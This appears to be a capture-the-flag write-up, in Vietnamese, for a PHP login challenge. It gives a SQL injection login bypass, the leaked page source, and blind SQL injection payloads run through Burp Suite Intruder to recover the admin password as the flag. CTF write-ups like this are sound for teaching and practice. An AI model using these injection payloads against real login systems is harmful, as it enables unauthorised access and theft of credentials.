- Đăng nhập với username:  ' or 1=1 --, nhận được đoạn script: 
Congratulations!
It's too easy?
Don't worry.
The flag is admin's password.

```html
    <title>q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6q6</title>
  </head>
  <body>
    <?php if (!$login) { ?>
    <p>
      First, login as "admin".
    </p>
    <div style="font-weight:bold; color:red">
      <?php echo h($err); ?>
    </div>
    <form method="POST">
      <div>ID: <input type="text" name="id" value="<?php echo h($id); ?>"></div>
      <div>Pass: <input type="text" name="pass" value="<?php echo h($pass); ?>"></div>
      <div><input type="submit"></div>
    </form>
    <?php } else { ?>
    <p>
      Congratulations!<br>
      It's too easy?<br>
      Don't worry.<br>
      The flag is admin's password.<br>
      <br>
      Hint:<br>
    </p>
    <pre><?php echo h(file_get_contents('index.php')); ?></pre>
    <?php } ?>
  </body>
</html>
```

=> Flag là mật khẩu của admin

- Dùng Burp Suite để brute force ra mật khẩu của admin
    + Dùng Intruder để lấy độ dài của pass: id=' OR LENGTH(pass)=§10§;--&pass=
    => lấy được LENGTH(pass)=21 do khác biệt ở cột Length
    + Tiếp tục dùng Intruder để lấy pass của admin: brute force(a-z0-9)
    => lấy được flag kpwa4ji3uzk6trpk
    + Thử các kí tự đặc biệt với phần tử còn trống, lấy được kí tự : _
    + Login with user: admin & pass: flag_kpwa4ji3uzk6trpk
